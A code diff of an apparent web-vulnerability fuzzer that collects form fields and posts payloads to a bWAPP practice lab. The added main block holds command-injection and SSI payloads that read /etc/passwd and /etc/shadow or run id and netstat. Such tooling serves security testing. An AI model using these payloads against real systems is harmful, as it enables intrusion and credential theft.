@@ -36,13 +36,24 @@ def findInput(url, session = None):
     input_form = soup.find_all("input")
     return [i.get("name") for i in input_form if i.get("name") is not None]
 
+def findSelect(url, session = None):
+    if (session is not None): 
+        content = session.get(url).content
+    else:
+        content = requests.get(url).content
+    soup = bs4(content, "html.parser")
+    select_form = soup.find_all("select")
+    return [i.get("name") for i in select_form if i.get("name") is not None]
+
 def post_validation(url: str, type_attack: str, login_dvwa: bool = False):
     context_data = {}
     if (login_dvwa):
         session = createSessionBwapp(URL)
         input_id = findInput(url, session)
+        input_id += findSelect(url, session)
     else:
         input_id = findInput(url) # type list
+        input_id += findSelect(url)
     
     context_data = {
         "url": url,
@@ -64,7 +75,6 @@ def post_request(url: str, payloads: list, data: dict, login_dvwa: bool = False)
         if (re.search("\$(.*?)\$", value) != None):
             v = postParser(value, payloads)
             current_data[key] = v
-    
     processed_data = []
     for key, value in current_data.items():
         if (len(value) > 1 and isinstance(value, list)):
@@ -88,6 +98,18 @@ def post_request(url: str, payloads: list, data: dict, login_dvwa: bool = False)
     return result
 
 
-# if __name__ == "__main__":
-    # payload 
-    # post_request("https://bwapp.hakhub.net/sqli_6.php", payload, {"title": "$$", "action": "search"}, login_dvwa=True)
+if __name__ == "__main__":
+    payload = """
+    cat /etc/passwd
+    &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+    &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+    &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+    /index.html|id|
+    ;id;
+    ;id
+    ;netstat -a;
+    ;system('cat%20/etc/passwd')
+    ;id;
+    """.split("\n")
+    response = post_request("https://bwapp.hakhub.net/commandi.php", payload, {"target": "www.nsa.gov $$"}, login_dvwa=True)
+    print(response)
